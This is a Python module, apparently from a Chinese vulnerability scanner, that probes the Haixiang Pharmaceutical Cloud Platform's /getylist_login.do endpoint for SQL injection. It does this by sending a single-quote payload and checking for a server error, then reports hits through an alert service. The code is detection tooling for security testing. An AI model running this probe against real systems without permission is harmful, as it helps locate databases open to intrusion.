from Common.Common_Request import common_request
from Modules import ServerJ


class Basic_information:
    no = 91,
    bugName = "成都海翔软件有限公司海翔药业云平台sql注入"


def scan_Haixiang_Pharmaceutical_Cloud_SQL_Injection(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/getylist_login.do"
    headers = {
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://127.0.0.1",
        "Referer": "http://127.0.0.1/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "JSESSIONID=FAE14B13415BA359B95FE239A9272270; __session:0.4635490933257511:=http:",
        "Connection": "close"
    }
    data = {"accountname": "1"}
    response = common_request(url, path, headers, data=data, method='POST', timeout=5, proxies=proxies,
                              append_to_output=append_to_output)
    if response is not None:
        if response.status_code == 200:
            data2 = {"accountname": "1'"}
            response2 = common_request(url, path, headers, data=data2, method='POST', timeout=5, proxies=proxies,
                                       append_to_output=append_to_output)
            if response2 is not None:
                if response2.status_code == 500:
                    append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                    ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)

                    endurl = "/getylist_login.do"
                    data = {"accountname": "1"}
                    headers = {
                        "Host": url,
                        "Accept": "*/*",
                        "X-Requested-With": "XMLHttpRequest",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "Origin": "http://127.0.0.1",
                        "Referer": "http://127.0.0.1/",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "zh-CN,zh;q=0.9",
                        "Cookie": "JSESSIONID=FAE14B13415BA359B95FE239A9272270; __session:0.4635490933257511:=http:",
                        "Connection": "close"
                    }
                    http_request = f"POST {endurl} HTTP/1.1\n"
                    for header, value in headers.items():
                        http_request += f"{header}: {value}\n"
                    http_request += "\n"
                    http_request += "&".join([f"{key}={value}" for key, value in data.items()])
                    append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                    append_to_output(f"[-] 回显的内容为：\n {response.text} ", "yellow")
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
